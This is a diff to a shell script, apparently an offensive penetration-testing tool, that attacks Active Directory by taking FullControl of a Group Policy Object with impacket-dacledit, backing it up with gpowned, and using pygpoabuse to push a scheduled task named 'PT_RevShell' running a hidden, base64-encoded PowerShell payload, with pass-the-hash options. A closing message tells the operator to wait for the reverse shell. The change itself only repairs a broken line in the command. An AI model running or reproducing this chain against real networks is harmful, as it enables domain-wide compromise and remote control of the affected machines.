@@ -32,15 +32,13 @@ then
 
   gpowned -u $user -hashes :$password -d $domain -dc-ip $target_ip -gpcmachine -backup backupgpo -name "{$gpo_guid}"
 
-  pygpoabuse -hashes :$password $domain/$user -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload_stage1
-" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
+  pygpoabuse -hashes :$password $domain/$user -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload_stage1" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
 else
   impacket-dacledit -principal $user -target-dn="$gpo_ldap_query" -dc-ip $target_ip $domain/$user:$password -action write -rights FullControl
 
   gpowned -u $user -p $password -d $domain -dc-ip $target_ip -gpcmachine -backup backupgpo -name "{$gpo_guid}"
 
-  pygpoabuse $domain/$user:$password -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload_stage1
-" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
+  pygpoabuse $domain/$user:$password -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload_stage1" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
 fi
 
 echo -e "\nBe patient: this reverse shell could take as long as 30 minutes to come back"
